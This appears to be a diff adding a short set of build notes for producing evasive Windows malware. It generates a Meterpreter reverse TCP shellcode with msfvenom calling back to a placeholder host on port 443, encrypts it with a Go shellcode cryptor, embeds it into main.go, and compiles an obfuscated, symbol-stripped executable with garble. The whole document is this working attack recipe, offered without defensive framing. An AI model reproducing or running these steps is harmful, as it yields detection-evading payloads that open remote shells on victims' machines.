@@ -1,0 +1,19 @@
+
+
+// install garball 
+
+
+export GOBIN=$HOME/go/bin
+export PATH=$PATH:$GOBIN
+
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > met.bin
+
+GOOS=linux GOARCH=amd64 go build shellcode_cryptor.go
+
+./shellcode_cryptor > data.go 
+
+// copy byteSlice into main.go 
+
+
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 garble build -p 4 -ldflags "-s -w -extldflags '-flto'" -o test.exe main.go
